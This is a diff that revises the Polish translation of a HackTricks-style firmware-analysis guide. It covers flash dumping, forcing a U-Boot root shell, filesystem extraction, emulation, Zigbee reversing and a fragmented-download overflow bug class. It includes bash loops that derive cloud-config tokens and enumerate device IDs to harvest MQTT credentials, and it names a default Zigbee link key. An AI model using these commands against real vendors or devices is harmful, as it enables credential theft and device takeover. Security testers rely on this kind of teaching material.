@@ -1,6 +1,10 @@
-# Analiza firmware'u
+# Analiza firmware
 
 {{#include ../../banners/hacktricks-training.md}}
+
+{{#ref}}
+../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
+{{#endref}}
 
 ## **Wprowadzenie**
 
@@ -23,55 +27,55 @@ android-mediatek-secure-boot-bl2_ext-bypass-el3.md
 mediatek-xflash-carbonara-da2-hash-bypass.md
 {{#endref}}
 
-Firmware to niezbędne oprogramowanie, które umożliwia prawidłowe działanie urządzeń poprzez zarządzanie komunikacją między komponentami sprzętowymi a oprogramowaniem, z którym użytkownicy mają kontakt, oraz ułatwianie tej komunikacji. Jest przechowywany w pamięci trwałej, dzięki czemu urządzenie może uzyskać dostęp do najważniejszych instrukcji od momentu włączenia, co prowadzi do uruchomienia systemu operacyjnego. Analiza i potencjalna modyfikacja firmware'u to kluczowy etap identyfikowania luk w zabezpieczeniach.<sup>[[2]](#references)[[3]](#references)</sup>
+Firmware to niezbędne oprogramowanie, które umożliwia prawidłowe działanie urządzeń poprzez zarządzanie komunikacją między komponentami sprzętowymi a oprogramowaniem, z którym użytkownicy mają kontakt, oraz jej obsługę. Jest przechowywane w pamięci trwałej, dzięki czemu urządzenie ma dostęp do kluczowych instrukcji od momentu włączenia, co prowadzi do uruchomienia systemu operacyjnego. Analiza i potencjalna modyfikacja firmware to kluczowy etap identyfikowania luk w zabezpieczeniach.<sup>[[2]](#references)[[3]](#references)</sup>
 
 ## **Gromadzenie informacji**
 
-**Gromadzenie informacji** to kluczowy początkowy etap poznawania budowy urządzenia i wykorzystywanych przez nie technologii. Proces ten obejmuje zbieranie danych dotyczących:
+**Gromadzenie informacji** to kluczowy pierwszy etap poznawania budowy urządzenia i używanych przez nie technologii. Proces ten obejmuje zbieranie danych dotyczących:
 
 - Architektury CPU i uruchamianego systemu operacyjnego
 - Szczegółów bootloadera
-- Układu sprzętowego i datasheetów
+- Układu sprzętowego i dokumentacji datasheet
 - Metryk codebase'u i lokalizacji kodu źródłowego
 - Bibliotek zewnętrznych i typów licencji
 - Historii aktualizacji i certyfikatów zgodności z przepisami
 - Diagramów architektury i przepływu
 - Ocen bezpieczeństwa i zidentyfikowanych luk
 
-W tym celu nieocenione są narzędzia **open-source intelligence (OSINT)**, podobnie jak analiza wszelkich dostępnych komponentów open-source software'u w ramach manualnych i automatycznych procesów przeglądu. Narzędzia takie jak [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) oferują bezpłatną analizę statyczną, którą można wykorzystać do wykrywania potencjalnych problemów.
+W tym celu nieocenione są narzędzia **open-source intelligence (OSINT)**, podobnie jak analiza wszelkich dostępnych komponentów open-source software'u poprzez ręczne i automatyczne procesy przeglądu. Narzędzia takie jak [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) oferują bezpłatną analizę statyczną, którą można wykorzystać do wykrywania potencjalnych problemów.
 
-## **Pozyskiwanie firmware'u**
+## **Pozyskiwanie firmware**
 
 Firmware można pozyskać na różne sposoby, z których każdy charakteryzuje się innym poziomem złożoności:
 
-- **Bezpośrednio** ze źródła (developerów, producentów)
+- **Bezpośrednio** ze źródła (developerzy, producenci)
 - **Budując** go na podstawie dostarczonych instrukcji
 - **Pobierając** z oficjalnych stron wsparcia
-- Wykorzystując zapytania **Google dork** do wyszukiwania hostowanych plików firmware'u
+- Wykorzystując zapytania **Google dork** do wyszukiwania hostowanych plików firmware
 - Uzyskując bezpośredni dostęp do **cloud storage**, za pomocą narzędzi takich jak [S3Scanner](https://github.com/sa7mon/S3Scanner)
 - Przechwytując **aktualizacje** za pomocą technik man-in-the-middle
 - **Ekstrahując** je z urządzenia poprzez połączenia takie jak **UART**, **JTAG** lub **PICit**
 - **Sniffując** żądania aktualizacji w komunikacji urządzenia
 - Identyfikując i wykorzystując **hardcoded update endpoints**
-- **Dumpując** firmware z bootloadera lub sieci
-- **Wyjmując i odczytując** układ pamięci, gdy wszystkie inne metody zawiodą, za pomocą odpowiednich narzędzi sprzętowych
+- **Dumpując** dane z bootloadera lub sieci
+- **Usuwając i odczytując** chip pamięci, gdy wszystkie inne metody zawiodą, przy użyciu odpowiednich narzędzi sprzętowych
 
-### Logi wyłącznie przez UART: wymuszenie roota shell za pomocą env U-Boot w pamięci flash
+### Logi wyłącznie przez UART: wymuszenie root shell przez env U-Boot w pamięci flash
 
-Jeśli RX UART jest ignorowany (widoczne są tylko logi), nadal możesz wymusić init shell poprzez **offline'ową edycję blobu środowiska U-Boot**:<sup>[[6]](#references)</sup>
+Jeśli RX UART jest ignorowany (dostępne są tylko logi), nadal możesz wymusić init shell poprzez **offline'ową edycję bloba środowiska U-Boot**:<sup>[[6]](#references)</sup>
 
-1. Zdumpuj SPI flash za pomocą klipsa SOIC-8 i programatora (3,3 V):
+1. Zrzuć zawartość SPI flash za pomocą klipsa SOIC-8 i programatora (3,3 V):
 ```bash
 flashrom -p ch341a_spi -r flash.bin
 ```
-2. Zlokalizuj partycję środowiska U-Boot, zmodyfikuj `bootargs`, aby zawierał `init=/bin/sh`, i **ponownie oblicz CRC32 środowiska U-Boot** dla blobu.
-3. Ponownie zaprogramuj wyłącznie partycję env i uruchom urządzenie ponownie; shell powinien pojawić się w UART.
+2. Zlokalizuj partycję środowiska U-Boot, zmodyfikuj `bootargs`, dodając `init=/bin/sh`, i **ponownie oblicz CRC32 środowiska U-Boot** dla bloba.
+3. Zapisz ponownie wyłącznie partycję środowiska i uruchom urządzenie ponownie; shell powinien pojawić się na UART.
 
-Jest to przydatne w przypadku urządzeń embedded, w których shell bootloadera jest wyłączony, ale partycja env jest zapisywalna poprzez zewnętrzny dostęp do pamięci flash.
+Jest to przydatne w przypadku urządzeń embedded, na których shell bootloadera jest wyłączony, ale partycję środowiska można zapisywać poprzez zewnętrzny dostęp do pamięci flash.
 
-## Analiza firmware'u
+## Analiza firmware
 
-Teraz, gdy **masz firmware**, musisz wyekstrahować z niego informacje, aby wiedzieć, jak z nim postępować. Możesz użyć do tego różnych narzędzi:
+Teraz, gdy **masz firmware**, musisz wyodrębnić z niego informacje, aby wiedzieć, jak należy go analizować. Możesz w tym celu użyć różnych narzędzi:
 ```bash
 file <bin>
 strings -n8 <bin>
@@ -80,7 +84,7 @@ hexdump -C -n 512 <bin> > hexdump.out
 hexdump -C <bin> | head # might find signatures in header
 fdisk -lu <bin> #lists a drives partition and filesystems if multiple
 ```
-Jeśli za pomocą tych narzędzi nie znajdziesz zbyt wiele, sprawdź **entropię** obrazu za pomocą `binwalk -E <bin>`; jeśli entropia jest niska, obraz prawdopodobnie nie jest zaszyfrowany. Jeśli entropia jest wysoka, obraz prawdopodobnie jest zaszyfrowany (lub w jakiś sposób skompresowany).
+Jeśli za pomocą tych narzędzi nie znajdziesz zbyt wiele, sprawdź **entropię** obrazu poleceniem `binwalk -E <bin>`; jeśli entropia jest niska, obraz prawdopodobnie nie jest zaszyfrowany. Jeśli entropia jest wysoka, prawdopodobnie jest zaszyfrowany (lub w jakiś sposób skompresowany).
 
 Ponadto możesz użyć tych narzędzi do wyodrębnienia **plików osadzonych wewnątrz firmware**:
 
@@ -89,16 +93,16 @@ Ponadto możesz użyć tych narzędzi do wyodrębnienia **plików osadzonych wew
 ../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
 {{#endref}}
 
-Możesz też użyć [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) do przeanalizowania pliku.
+Możesz też użyć [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)), aby przeanalizować plik.
 
 ### Uzyskiwanie systemu plików
 
-Za pomocą wcześniej opisanych narzędzi, takich jak `binwalk -ev <bin>`, powinno być możliwe **wyodrębnienie systemu plików**.\
-Binwalk zazwyczaj wyodrębnia go do **folderu nazwanego zgodnie z typem systemu plików**, którym zwykle jest jeden z następujących: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.
+Korzystając z opisanych wcześniej narzędzi, takich jak `binwalk -ev <bin>`, powinno udać Ci się **wyodrębnić system plików**.\
+Binwalk zwykle wyodrębnia go do **folderu nazwanego zgodnie z typem systemu plików**, który zazwyczaj jest jednym z następujących: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.
 
 #### Ręczne wyodrębnianie systemu plików
 
-Czasami binwalk **nie będzie mieć magic byte systemu plików w swoich sygnaturach**. W takich przypadkach użyj binwalk do **znalezienia offsetu systemu plików i wycięcia skompresowanego systemu plików** z pliku binarnego, a następnie **ręcznie wyodrębnij** system plików zgodnie z jego typem, korzystając z poniższych kroków.
+Czasami binwalk **nie będzie mieć magic byte systemu plików w swoich sygnaturach**. W takich przypadkach użyj binwalk, aby **znaleźć offset systemu plików i wyciąć skompresowany system plików** z pliku binarnego, a następnie **ręcznie wyodrębnij** system plików zgodnie z jego typem, korzystając z poniższych kroków.
 ```
 $ binwalk DIR850L_REVB.bin
 
@@ -128,7 +132,7 @@ Alternatywnie można również uruchomić następujące polecenie.
 
 `$ unsquashfs dir.squashfs`
 
-Pliki będą znajdować się później w katalogu "`squashfs-root`".
+Pliki będą później znajdować się w katalogu "`squashfs-root`".
 
 - Pliki archiwów CPIO
 
@@ -146,11 +150,11 @@ Pliki będą znajdować się później w katalogu "`squashfs-root`".
 
 ## Analiza firmware
 
-Po uzyskaniu firmware należy je przeanalizować, aby zrozumieć jego strukturę i potencjalne podatności. Proces ten obejmuje wykorzystanie różnych narzędzi do analizy i wyodrębniania wartościowych danych z obrazu firmware.
+Po uzyskaniu firmware należy dokładnie je przeanalizować, aby zrozumieć jego strukturę i potencjalne vulnerabilities. Proces ten obejmuje wykorzystanie różnych narzędzi do analizy i wyodrębniania wartościowych danych z obrazu firmware.
 
-### Początkowe narzędzia analityczne
+### Narzędzia do wstępnej analizy
 
-Poniżej przedstawiono zestaw poleceń do wstępnej inspekcji pliku binarnego (określanego jako `<bin>`). Polecenia te pomagają identyfikować typy plików, wyodrębniać ciągi znaków, analizować dane binarne oraz poznawać szczegóły partycji i systemu plików:
+Poniżej przedstawiono zestaw poleceń do wstępnej inspekcji pliku binarnego (oznaczonego jako `<bin>`). Polecenia te pomagają zidentyfikować typy plików, wyodrębnić strings, przeanalizować dane binarne oraz zrozumieć szczegóły dotyczące partycji i systemu plików:
 ```bash
 file <bin>
 strings -n8 <bin>
@@ -161,51 +165,51 @@ fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
 ```
 Aby ocenić stan szyfrowania obrazu, sprawdza się jego **entropię** za pomocą `binwalk -E <bin>`. Niska entropia sugeruje brak szyfrowania, natomiast wysoka entropia wskazuje na możliwe szyfrowanie lub kompresję.
 
-Do wyodrębniania **embedded files** zalecane są narzędzia i zasoby, takie jak dokumentacja **file-data-carving-recovery-tools** oraz **binvis.io** do inspekcji plików.
+Do wyodrębniania **osadzonych plików** zalecane są narzędzia i zasoby, takie jak dokumentacja **file-data-carving-recovery-tools** oraz **binvis.io** do inspekcji plików.
 
 ### Wyodrębnianie systemu plików
 
-Za pomocą `binwalk -ev <bin>` można zazwyczaj wyodrębnić system plików, często do katalogu o nazwie odpowiadającej typowi systemu plików (np. squashfs, ubifs). Jednak gdy **binwalk** nie rozpoznaje typu systemu plików z powodu brakujących magic bytes, konieczne jest ręczne wyodrębnianie. Polega ono na użyciu `binwalk` do znalezienia offsetu systemu plików, a następnie polecenia `dd` do wycięcia systemu plików:
+Za pomocą `binwalk -ev <bin>` można zazwyczaj wyodrębnić system plików, często do katalogu nazwanego na podstawie typu systemu plików (np. squashfs, ubifs). Jednak gdy **binwalk** nie rozpoznaje typu systemu plików z powodu brakujących magicznych bajtów, konieczne jest ręczne wyodrębnienie. Polega ono na użyciu `binwalk` do zlokalizowania offsetu systemu plików, a następnie polecenia `dd` do wycięcia systemu plików:
 ```bash
 $ binwalk DIR850L_REVB.bin
 
 $ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
 ```
-Następnie, w zależności od typu filesystemu (np. squashfs, cpio, jffs2, ubifs), używane są różne polecenia do ręcznego wyodrębnienia zawartości.
+Następnie, w zależności od typu filesystemu (np. squashfs, cpio, jffs2, ubifs), do ręcznego wyodrębnienia zawartości używa się różnych poleceń.
 
 ### Analiza filesystemu
 
-Po wyodrębnieniu filesystemu rozpoczyna się wyszukiwanie luk w zabezpieczeniach. Analizowane są niezabezpieczone network daemons, hardcoded credentials, API endpoints, funkcje update server, nie skompilowany kod, startup scripts oraz compiled binaries przeznaczone do analizy offline.
+Po wyodrębnieniu filesystemu rozpoczyna się wyszukiwanie luk w zabezpieczeniach. Analizowane są niezabezpieczone demony sieciowe, hardcoded credentials, endpointy API, funkcjonalności serwerów aktualizacji, niezkodowany kod, skrypty startowe oraz skompilowane pliki binarne do analizy offline.
 
-**Kluczowe lokalizacje** i **elementy** do sprawdzenia obejmują:
+**Najważniejsze lokalizacje** i **elementy** do sprawdzenia obejmują:
 
-- **etc/shadow** i **etc/passwd** pod kątem credentials użytkowników
+- **etc/shadow** i **etc/passwd** pod kątem danych uwierzytelniających użytkowników
 - Certyfikaty SSL i klucze w **etc/ssl**
 - Pliki konfiguracyjne i skrypty pod kątem potencjalnych luk
-- Embedded binaries do dalszej analizy
-- Typowe web servers i binaries urządzeń IoT
+- Osadzone pliki binarne do dalszej analizy
+- Popularne web servery i pliki binarne urządzeń IoT
 
-Kilka narzędzi pomaga w wykrywaniu poufnych informacji i luk w filesystemie:
+W wykrywaniu poufnych informacji i luk w filesystemie pomagają następujące narzędzia:
 
 - [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) do wyszukiwania poufnych informacji
 - [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) do kompleksowej analizy firmware
-- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) do analizy statycznej i dynamicznej
+- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) oraz [**EMBA**](https://github.com/e-m-b-a/emba) do analizy statycznej i dynamicznej
 
-### Kontrole bezpieczeństwa skompilowanych binaries
+### Kontrole bezpieczeństwa skompilowanych plików binarnych
 
-Zarówno source code, jak i compiled binaries znalezione w filesystemie muszą zostać dokładnie sprawdzone pod kątem luk. Narzędzia takie jak **checksec.sh** dla binaries Unix i **PESecurity** dla binaries Windows pomagają identyfikować niezabezpieczone binaries, które mogą zostać wykorzystane.
+Zarówno kod źródłowy, jak i skompilowane pliki binarne znalezione w filesystemie muszą zostać dokładnie przeanalizowane pod kątem luk. Narzędzia takie jak **checksec.sh** dla plików binarnych Unix oraz **PESecurity** dla plików binarnych Windows pomagają identyfikować niezabezpieczone pliki binarne, które mogłyby zostać wykorzystane.
 
-## Pozyskiwanie cloud config i credentials MQTT za pomocą derived URL tokens
+## Pozyskiwanie konfiguracji cloud i danych uwierzytelniających MQTT za pomocą tokenów wyprowadzanych z URL
 
-Wiele hubów IoT pobiera konfigurację przypisaną do urządzenia z cloud endpointu wyglądającego następująco:<sup>[[5]](#references)</sup>
+Wiele hubów IoT pobiera konfigurację właściwą dla danego urządzenia z endpointu cloud, który wygląda następująco:<sup>[[5]](#references)</sup>
 
 - `https://<api-host>/pf/<deviceId>/<token>`
 
-Podczas analizy firmware można odkryć, że `<token>` jest lokalnie wyprowadzany z device ID za pomocą hardcoded secret, na przykład:
+Podczas analizy firmware możesz odkryć, że `<token>` jest lokalnie wyprowadzany z identyfikatora urządzenia przy użyciu hardcoded secret, na przykład:
 
-- token = MD5( deviceId || STATIC_KEY ) i reprezentowany jako wielkie litery hex
+- token = MD5( deviceId || STATIC_KEY ) i przedstawiany jako wielkie litery w zapisie szesnastkowym
 
-Taka konstrukcja umożliwia każdemu, kto pozna deviceId i STATIC_KEY, odtworzenie URL oraz pobranie cloud config, często ujawniającego plaintext MQTT credentials i prefiksy topiców.
+Taka konstrukcja umożliwia każdemu, kto pozna deviceId i STATIC_KEY, odtworzenie URL i pobranie konfiguracji cloud, często ujawniającej dane uwierzytelniające MQTT w plaintext oraz prefiksy topiców.
 
 Praktyczny workflow:
 
@@ -215,7 +219,7 @@ Praktyczny workflow:
 ```bash
 picocom -b 115200 /dev/ttyUSB0
 ```
-- Poszukaj wierszy wypisujących wzorzec adresu URL konfiguracji chmurowej oraz adres brokera, na przykład:
+- Szukaj linii wypisujących wzorzec URL konfiguracji cloud oraz adres brokera, na przykład:
 ```
 Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
 MQTT: mqtt://mq-gw.vendor.tld:8001
@@ -224,24 +228,24 @@ MQTT: mqtt://mq-gw.vendor.tld:8001
 
 - Załaduj pliki binarne do Ghidra/radare2 i wyszukaj ścieżkę konfiguracji ("/pf/") lub użycie MD5.
 - Potwierdź algorytm (np. MD5(deviceId||STATIC_KEY)).
-- Wygeneruj token w Bash i zamień digest na wielkie litery:
+- Wyprowadź token w Bash i zamień skrót na wielkie litery:
 ```bash
 DEVICE_ID="d88b00112233"
 STATIC_KEY="cf50deadbeefcafebabe"
 printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
 ```
-3) Zbieranie konfiguracji cloud i poświadczeń MQTT
+3) Pozyskiwanie konfiguracji cloud i poświadczeń MQTT
 
-- Zbuduj URL i pobierz JSON za pomocą curl; przeanalizuj go za pomocą jq, aby wyodrębnić sekrety:
+- Złóż URL i pobierz JSON za pomocą curl; przeanalizuj go przy użyciu jq, aby wyodrębnić sekrety:
 ```bash
 API_HOST="https://api.vendor.tld"
 TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
 curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
 # Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
 ```
-4) Wykorzystaj plaintext MQTT i słabe topic ACLs (jeśli występują)
+4) Abuse plaintext MQTT i słabych topic ACLs (jeśli są dostępne)
 
-- Użyj odzyskanych credentials, aby zasubskrybować maintenance topics i wyszukać wrażliwe zdarzenia:
+- Użyj odzyskanych credentials, aby zasubskrybować maintenance topics i szukać wrażliwych zdarzeń:
 ```bash
 mosquitto_sub -h <broker> -p <port> -V mqttv311 \
 -i <client_id> -u <username> -P <password> \
@@ -249,8 +253,8 @@ mosquitto_sub -h <broker> -p <port> -V mqttv311 \
 ```
 5) Enumeruj przewidywalne identyfikatory urządzeń (na dużą skalę, za autoryzacją)
 
-- Wiele ekosystemów osadza bajty OUI producenta, produktu i typu, po których następuje sekwencyjny sufiks.
-- Możesz iterować po kandydujących identyfikatorach, programowo generować tokeny i pobierać konfiguracje:
+- Wiele ekosystemów zawiera bajty OUI/produktu/typu dostawcy, po których następuje sekwencyjny przyrostek.
+- Możesz iterować po kandydujących identyfikatorach, programowo wyprowadzać tokeny i pobierać konfiguracje:
 ```bash
 API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
 for SUF in $(seq -w 000000 0000FF); do
@@ -260,18 +264,19 @@ curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.pas
 done
 ```
 Uwagi
-- Zawsze uzyskaj wyraźną autoryzację przed próbą masowej enumeracji.
-- Jeśli to możliwe, preferuj emulację lub analizę statyczną w celu odzyskania sekretów bez modyfikowania docelowego hardware’u.
+- Zawsze uzyskaj wyraźną autoryzację przed podjęciem prób masowej enumeracji.
+- W miarę możliwości preferuj emulację lub analizę statyczną w celu odzyskania sekretów bez modyfikowania docelowego hardware'u.
 
-Proces emulowania firmware umożliwia **analizę dynamiczną** działania urządzenia lub pojedynczego programu. Podejście to może napotykać problemy związane z zależnościami od hardware’u lub architektury, jednak przeniesienie głównego systemu plików albo określonych plików binarnych na urządzenie o zgodnej architekturze i kolejności bajtów, takie jak Raspberry Pi, lub do gotowej maszyny wirtualnej, może ułatwić dalsze testowanie.
 
-### Emulowanie pojedynczych plików binarnych
+Proces emulacji firmware'u umożliwia **dynamic analysis** zarówno działania urządzenia, jak i pojedynczego programu. Podejście to może napotkać problemy związane z zależnościami od hardware'u lub architektury, ale przeniesienie root filesystemu lub określonych binariów na urządzenie o zgodnej architekturze i endianness, takie jak Raspberry Pi, albo do wcześniej przygotowanej maszyny wirtualnej, może ułatwić dalsze testowanie.
 
-Podczas badania pojedynczych programów kluczowe jest określenie kolejności bajtów i architektury CPU programu.
+### Emulacja pojedynczych binariów
+
+Podczas badania pojedynczych programów kluczowe jest określenie endianness i architektury CPU programu.
 
 #### Przykład z architekturą MIPS
 
-Aby emulować plik binarny dla architektury MIPS, można użyć polecenia:
+Do emulacji binariów architektury MIPS można użyć polecenia:
 ```bash
 file ./squashfs-root/bin/busybox
 ```
@@ -279,11 +284,11 @@ Aby zainstalować niezbędne narzędzia emulacyjne:
 ```bash
 sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
 ```
-Dla MIPS (big-endian) używany jest `qemu-mips`, natomiast w przypadku plików binarnych little-endian należy wybrać `qemu-mipsel`.
+W przypadku MIPS (big-endian) używany jest `qemu-mips`, a w przypadku binariów little-endian właściwym wyborem będzie `qemu-mipsel`.
 
 #### Emulacja architektury ARM
 
-W przypadku plików binarnych ARM proces wygląda podobnie — do emulacji wykorzystywany jest emulator `qemu-arm`.
+W przypadku binariów ARM proces jest podobny, a do emulacji wykorzystywany jest emulator `qemu-arm`.
 
 ### Pełna emulacja systemu
 
@@ -291,13 +296,13 @@ Narzędzia takie jak [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmw
 
 ## Dynamiczna analiza w praktyce
 
-Na tym etapie do analizy używane jest rzeczywiste lub emulowane środowisko urządzenia. Należy zapewnić stały dostęp powłoki do systemu operacyjnego i systemu plików. Emulacja może nie odwzorowywać idealnie interakcji sprzętowych, co może wymagać okresowego restartowania emulacji. Analiza powinna ponownie objąć system plików, wykorzystywać ujawnione strony internetowe i usługi sieciowe oraz badać podatności bootloadera. Testy integralności firmware mają kluczowe znaczenie dla identyfikacji potencjalnych podatności typu backdoor.
+Na tym etapie do analizy wykorzystywane jest rzeczywiste lub emulowane środowisko urządzenia. Niezbędne jest zachowanie dostępu shell do systemu operacyjnego i systemu plików. Emulacja może nie odwzorowywać idealnie interakcji sprzętowych, co może wymagać okazjonalnego ponownego uruchomienia emulacji. Analiza powinna ponownie objąć system plików, wykorzystywać ujawnione strony internetowe i usługi sieciowe oraz badać luki w bootloaderze. Testy integralności firmware mają kluczowe znaczenie dla identyfikacji potencjalnych luk typu backdoor.
 
-## Techniki analizy runtime
+## Techniki analizy w czasie działania
 
-Analiza runtime polega na interakcji z procesem lub plikiem binarnym w jego środowisku operacyjnym, z wykorzystaniem narzędzi takich jak gdb-multiarch, Frida i Ghidra do ustawiania breakpointów oraz identyfikowania podatności za pomocą fuzzingu i innych technik.
+Analiza w czasie działania obejmuje interakcję z procesem lub binarium w jego środowisku operacyjnym, z wykorzystaniem narzędzi takich jak gdb-multiarch, Frida i Ghidra do ustawiania breakpointów oraz identyfikowania luk za pomocą fuzzingu i innych technik.
 
-W przypadku celów embedded bez pełnego debuggera **skopiuj statycznie linkowany `gdbserver`** na urządzenie i dołącz się zdalnie:<sup>[[6]](#references)</sup>
+W przypadku celów embedded bez pełnego debuggera **skopiuj statycznie linkowany `gdbserver`** na urządzenie i podłącz się zdalnie:<sup>[[6]](#references)</sup>
 ```bash
 # On device
 gdbserver :1234 /usr/bin/targetd
@@ -310,161 +315,161 @@ target remote <device-ip>:1234
 ```
 ### Mapowanie komunikatów Zigbee / radio-co-processor
 
-W hubach IoT stos RF jest często podzielony między **radio MCU** a proces użytkownika systemu Linux. Przydatny workflow polega na zmapowaniu ścieżki:<sup>[[8]](#references)</sup>
+W hubach IoT stos RF jest często podzielony między **radio MCU** a proces działający w userlandzie systemu Linux. Przydatny workflow polega na zmapowaniu ścieżki:<sup>[[8]](#references)</sup>
 
-1. **Ramka RF** przesyłana drogą radiową
-2. **parser po stronie kontrolera** w radio MCU
-3. **tekstowy protokół szeregowy/UART lub protokół TLV** przekazywany do systemu Linux (na przykład `/dev/tty*`)
-4. **dispatcher aplikacji** w głównym daemonie
-5. **handler specyficzny dla protokołu / state machine**
+1. **RF frame** w eterze
+2. **controller-side parser** w radio MCU
+3. **serial/UART text or TLV protocol** przekazywany do systemu Linux (na przykład `/dev/tty*`)
+4. **application dispatcher** w głównym daemonie
+5. **protocol-specific handler / state machine**
 
-Ta architektura tworzy dwa cele reverse engineeringu zamiast jednego. Jeśli kontroler konwertuje binarne ramki radiowe na protokół tekstowy, taki jak `Group,Command,arg1,arg2,...`, odzyskaj:
+Taka architektura tworzy dwa cele reverse engineeringu zamiast jednego. Jeśli kontroler konwertuje binarne RF frames na protokół tekstowy, taki jak `Group,Command,arg1,arg2,...`, odzyskaj:
 
-- **grupy komunikatów** i tabele dispatch
-- Które komunikaty mogą pochodzić z **sieci**, a które od samego kontrolera
-- Dokładne **pola discriminator specyficzne dla producenta** (na przykład Zigbee `manufacturer_code` i niestandardowe `cluster_command`)
-- Które handlery są osiągalne wyłącznie podczas **commissioning**, discovery lub faz pobierania firmware/modelu
+- **message groups** i tablice dispatchera
+- Które komunikaty mogą pochodzić z **network**, a które z samego kontrolera
+- Dokładne **manufacturer-specific discriminator fields** (na przykład Zigbee `manufacturer_code` i custom `cluster_command`)
+- Które handlery są osiągalne wyłącznie podczas faz **commissioning**, discovery lub pobierania firmware/modelu
 
-W przypadku Zigbee przechwytuj ruch pairing i sprawdź, czy cel nadal korzysta z domyślnego **Link Key** `ZigBeeAlliance09`. Jeśli tak, sniffing ruchu commissioning może ujawnić **Network Key**. Install codes w Zigbee 3.0 ograniczają tę ekspozycję, więc odnotuj, czy testowane urządzenie faktycznie ich wymaga.
+W przypadku Zigbee przechwyć ruch pairing i sprawdź, czy cel nadal korzysta z domyślnego **Link Key** `ZigBeeAlliance09`. Jeśli tak, sniffing ruchu commissioning może ujawnić **Network Key**. Zigbee 3.0 install codes ograniczają tę ekspozycję, dlatego odnotuj, czy testowane urządzenie faktycznie ich wymaga.
 
-### Handlery protokołów specyficznych dla producenta i osiągalność kontrolowana przez FSM
+### Manufacturer-specific protocol handlers i osiągalność kontrolowana przez FSM
 
-Specyficzne dla vendora komendy Zigbee/ZCL są często lepszym celem niż ustandaryzowane klastry, ponieważ trafiają do **niestandardowego kodu parsującego** i wewnętrznych **FSM**, które przeszły mniej testów walidacyjnych.<sup>[[8]](#references)</sup>
+Vendor-specific Zigbee/ZCL commands są często lepszym celem niż standardized clusters, ponieważ trafiają do **custom parsing code** i wewnętrznych **FSMs**, które mają słabiej przetestowaną walidację.<sup>[[8]](#references)</sup>
 
 Praktyczny workflow:
 
-- Reverse handler command dispatch, aż znajdziesz **handler dostępny wyłącznie dla vendora**.
-- Odzyskaj tabele **stanu FSM**, **zdarzenia**, **warunku**, **akcji** i **następnego stanu**.
-- Zidentyfikuj **stany przejściowe**, które automatycznie przechodzą dalej, oraz gałęzie retry/error, które ostatecznie resetują lub zwalniają stan kontrolowany przez atakującego.
-- Potwierdź, które prawidłowe wymiany protokołu są wymagane, aby umieścić daemon w podatnym stanie, zamiast zakładać, że wadliwy handler jest zawsze osiągalny.
+- Przeprowadź reverse engineering command dispatchera, aż znajdziesz **vendor-only handler**.
+- Odzyskaj tablice **FSM state**, **event**, **check**, **action** i **next-state**.
+- Zidentyfikuj **transitional states**, które automatycznie przechodzą dalej, oraz gałęzie retry/error, które ostatecznie resetują lub zwalniają state kontrolowany przez atakującego.
+- Potwierdź, które prawidłowe wymiany protokołu są wymagane, aby umieścić daemon w podatnym stanie, zamiast zakładać, że buggy handler jest zawsze osiągalny.
 
-W przypadku protokołów wrażliwych na timing replay pakietów z frameworka Python może być zbyt wolny. Bardziej niezawodnym podejściem jest emulowanie prawidłowego urządzenia na prawdziwym sprzęcie (na przykład **nRF52840**) z użyciem stacka klasy vendor-grade, aby można było ujawnić właściwe **endpoints**, **attributes** i timing commissioning.
+W przypadku protokołów wrażliwych na timing packet replay z frameworka Python może być zbyt wolny. Bardziej niezawodne podejście polega na emulowaniu prawidłowego urządzenia na rzeczywistym hardware (na przykład **nRF52840**) z vendor-grade stack, aby można było ujawnić właściwe **endpoints**, **attributes** i timing commissioning.
 
 ### Klasa błędów fragmented-download w embedded daemonach
 
-Powtarzająca się klasa błędów firmware występuje w przypadku **fragmentowanych pobrań blobów/modeli/konfiguracji**:<sup>[[8]](#references)</sup>
+Powtarzająca się klasa błędów firmware występuje w **fragmented blob/model/configuration downloads**:<sup>[[8]](#references)</sup>
 
-1. **Pierwszy fragment** (`offset == 0`) zapisuje `ctx->total_size` i wykonuje alokację `malloc(total_size)`.
-2. Kolejne fragmenty sprawdzają wyłącznie kontrolowane przez atakującego pola **lokalne dla pakietu**, takie jak `packet_total_size >= offset + chunk_len`.
-3. Kopiowanie używa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez sprawdzenia względem **oryginalnego rozmiaru zaalokowanego bufora**.
+1. **First fragment** (`offset == 0`) zapisuje `ctx->total_size` i wykonuje `malloc(total_size)`.
